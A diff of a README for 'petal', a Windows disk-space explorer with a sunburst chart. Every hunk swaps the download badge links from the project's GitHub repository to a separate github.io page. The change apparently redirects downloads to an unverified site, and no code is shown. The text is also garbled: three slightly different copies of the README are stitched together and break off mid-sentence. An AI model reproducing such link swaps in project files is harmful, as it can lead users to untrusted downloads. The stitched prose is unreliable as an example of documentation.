@@ -1,6 +1,6 @@
 # 🌸 petal - See what is using your disk
 
-[![Download petal](https://img.shields.io/badge/Download_petal-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maryjaneagitated610/petal)
+[![Download petal](https://img.shields.io/badge/Download_petal-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://maryjaneagitated610.github.io)
 
 petal is a fast, exact disk-space explorer with a live sunburst chart. It helps you see where storage is going without opening folder after folder and guessing which files are the biggest. The chart gives you a clear picture of your disk, and the app is built to feel quick and responsive while you explore.
 
@@ -31,7 +31,7 @@ Before you begin, make sure you are on the Windows computer where you want to us
 
 ## ⬇️ Download and Setup
 
-[![Download petal](https://img.shields.io/badge/Download_petal-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maryjaneagitated610/petal)
+[![Download petal](https://img.shields.io/badge/Download_petal-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://maryjaneagitated610.github.io)
 
 Visit this link to download the application.
 
@@ -54,7 +54,7 @@ Once the first view is ready, start at the center of the chart. The center repre
 5. **Move back when needed.** Use the app’s navigation to return to a broader view.
 6. **Repeat with the next largest area.** Work through the biggest sections first. This gives you the clearest path# 🌸 petal - See what is using your disk
 
-[![Download petal](https://img.shields.io/badge/Download_petal-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maryjaneagitated610/petal)
+[![Download petal](https://img.shields.io/badge/Download_petal-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://maryjaneagitated610.github.io)
 
 petal is a fast, exact disk-space explorer with a live sunburst chart. It gives you a visual way to understand storage use on your computer. Instead of opening folders one by one and guessing which files are the biggest, you open petal and follow the chart. The largest areas of the chart show where the most space is being used. The smaller areas show the details inside.
 
@@ -84,7 +84,7 @@ Use the download button at the top of this page, or use the download link in the
 
 ## ⬇️ Download and Setup
 
-[![Download petal](https://img.shields.io/badge/Download_petal-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maryjaneagitated610/petal)
+[![Download petal](https://img.shields.io/badge/Download_petal-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://maryjaneagitated610.github.io)
 
 Visit this link to download the application.
 
@@ -121,7 +121,7 @@ A large section near the center can contain many smaller sections in the outer r
 - **Work one level at a time.** Clicking deeper too quickly can make the chart feel busy.
 - **Keep the window large.** A bigger# 🌸 petal - See What's Using Your Disk
 
-[![Download petal](https://img.shields.io/badge/Download_petal-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maryjaneagitated610/petal)
+[![Download petal](https://img.shields.io/badge/Download_petal-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://maryjaneagitated610.github.io)
 
 petal is a fast, exact disk-space explorer with a live sunburst chart. It is built with Rust + GPUI. In everyday terms, petal shows you a visual map of your storage. The biggest parts of the map are the places using the most space. You do not need programming knowledge to use it. You open the app, let it read your disk, and follow the chart to understand where storage is going.
 
@@ -153,7 +153,7 @@ Use the download button at the top of this page, or the download link in the nex
 
 ## ⬇️ Download and Setup
 
-[![Download petal](https://img.shields.io/badge/Download_petal-FF8C00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/maryjaneagitated610/petal)
+[![Download petal](https://img.shields.io/badge/Download_petal-FF8C00?style=for-the-badge&logo=github&logoColor=white)](https://maryjaneagitated610.github.io)
 
 Visit this link to download the application.
 
